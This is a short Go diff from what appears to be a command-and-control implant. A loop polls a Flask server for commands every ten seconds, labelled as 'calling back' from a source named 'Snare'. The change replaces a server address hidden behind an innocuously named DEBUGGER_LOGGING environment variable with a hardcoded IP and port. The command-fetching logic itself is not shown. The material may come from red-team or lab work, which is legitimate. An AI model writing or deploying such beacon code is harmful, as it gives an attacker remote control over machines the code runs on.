@@ -17,9 +17,9 @@ import (
 	"time"
 )
 
-var serv = getServer() //IP of flask serv
-var src = "Snare"      // where is this calling back from
-var loopTime = 10      //sleep time in secs
+var serv = "192.168.58.129:5000" //IP of flask serv
+var src = "Snare"                // where is this calling back from
+var loopTime = 10                //sleep time in secs
 
 func getServer() string {
 	envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
@@ -61,7 +61,6 @@ func getCommands() {
 
 func main() {
 	for {
-
 		getCommands()
 		time.Sleep(time.Duration(loopTime) * time.Second)
 	}
